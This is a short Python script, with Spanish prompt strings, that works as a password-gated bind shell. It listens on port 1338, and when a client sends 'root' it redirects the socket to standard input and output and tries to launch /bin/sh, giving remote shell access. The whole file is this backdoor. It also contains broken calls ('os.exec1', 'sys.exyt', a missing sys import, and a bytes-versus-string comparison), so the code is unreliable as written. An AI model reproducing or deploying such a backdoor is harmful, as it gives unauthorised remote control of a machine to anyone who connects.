#!/usr/bin/env python
#--*--coding:UTF-8 --*--

import socket
import os
import code

host = ''
port = 1338
palabra = ""

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
client, direction = s.accept()
print(direction)
print(client.getpeername())
client.send("Hola eni\n".encode())
palabra = client.recv(1024)
print(palabra)
while 1:
    if palabra=="root\n":
        print("Estamos en root")
        for f in range (3):
            os.dup2(client.fileno(), f)
        os.exec1("/bin/sh", "/bin/sh")
        code.interact()
        sys.exyt()
    else:
        print("Salimos")
        break
client.close()
s.close()
